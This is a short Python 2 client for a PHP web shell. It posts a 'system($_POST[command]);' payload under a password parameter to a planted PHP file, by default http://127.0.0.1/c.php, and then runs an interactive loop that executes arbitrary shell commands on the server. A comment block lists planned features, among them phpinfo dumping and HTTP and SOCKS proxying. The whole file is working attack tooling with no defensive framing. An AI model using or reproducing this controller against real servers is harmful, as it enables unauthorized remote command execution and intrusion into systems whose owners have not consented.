#!/usr/bin/env python
# encoding: utf-8

import requests
import string


'''
def code_exec(url, code):
    return status


def check_shell_exec(url):

def get_system_info():

def get_phpinfo():

def http_proxy():

def socks_proxy():

def

'''





def init(url, method, auth):
    return ""

def shell_exec(url, method, auth, command):
    # system, exec, shell_exec, popen, proc_open, passthru
    if method == "POST":
        data = {auth:"system($_POST[command]);",  "command":command}
        response = requests.post(url, data=data)
    elif method == "GET":
        data = {auth:"system($_GET[command]);", "command":command}
        response = requests.get(url, data=data)
    else:
        return (False, "Unsupported method!")
    content = response.text
    if response.status_code == 200:
        return (True, content)
    else:
        return (False, content)

def shell(url, method, auth):
    while True:
        command = raw_input("$ ")
        if string.lower(command) == "exit":
            break
        result = shell_exec(url, method, auth, command)
        if result[0]:
            print "%s" % (result[1])
        else:
            print "[-] %s" % (result[1])

def main():
    url = "http://127.0.0.1/c.php"
    method = "POST"
    auth = "c"
    shell(url, method, auth)

if __name__ == "__main__":
    main()
